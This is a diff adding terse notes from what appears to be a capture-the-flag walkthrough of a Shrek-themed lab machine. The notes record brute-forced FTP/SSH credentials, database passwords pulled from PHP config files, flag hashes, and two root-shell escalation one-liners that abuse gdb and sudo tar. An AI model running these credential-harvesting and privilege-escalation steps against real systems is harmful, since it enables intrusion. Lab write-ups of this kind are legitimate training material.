@@ -1,0 +1,132 @@
+!-- shrek is like an onion -->
+<!-- NzM2ODcyNjU2bzY5NzM2MTZzNnI2OTZzNnI= -->
+
+
+736872656o6973616s6r696s6r
+
+
+
+
+
+
+Disallow: /Cpxtpt2hWCee9VFa.txt
+
+
+
+
+
+
+
+http://10.10.36.211/cms/admin/login.php
+
+
+
+
+
+[21][ftp] host: 10.10.36.211   login: shrek   password: 12345678
+[22][ssh] host: 10.10.36.211   login: shrek   password: 12345678
+
+
+
+ftp/shrek/flag.txt
+0069ba233da89efe6f48e7d214034130
+
+
+
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+/proc/sys/kernel/yama/ptrace_scope is enabled (0)
+gdb was found in PATH
+
+
+
+gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
+
+
+
+
+/home/shrek/
+0069ba233da89efe6f48e7d214034130
+
+
+/home/puss/
+6f960e8f2ea8e3de92f192fae492ec59
+
+
+/home/donkey
+974acecd51cc45c843062fdac6235e97
+
+
+/root/
+8cc6ece048e6c42251c411814ff5a22d
+
+
+
+
+[+] Searching passwords in config PHP files
+/var/www/html/api/config.php
+/var/www/html/cms/config.php
+/var/www/html/cms/lib/classes/class.cms_config.php
+
+
+
+$databaseHost = 'localhost';
+$databaseName = 'api';
+$databaseUsername = 'root';
+$databasePassword = 'password';
+
+
+
+
+msql>api>users>
+ftp  | EkRYje58bhFpg2uW
+
+
+
+message.txt
+
+
+user:donkey
+pass:J5rURvCa8DyTg3vR
+
+
+
+User donkey may run the following commands on
+        shrek:
+    (ALL) NOPASSWD: /usr/bin/tar
+
+
+
+
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+
+
+
+
+
+mysql>cms>flag
++----------------------------------+
+| Flag                             |
++----------------------------------+
+| 877fe779d235694836c7f5478363974f |
++----------------------------------+
+
+
+
+
+
+donkey    ALL=(ALL)       ALL
+
+
+
+
+/srv/web/flag.txt
+af847d9403e2106a3cb2fd69f33b2d5e
+
+e000490068742c9826b7dccebbfbe54fe01f2f76a69b8df9e96ea5fca359f1f1
+
+
+
+/usr/local/go/src/flag
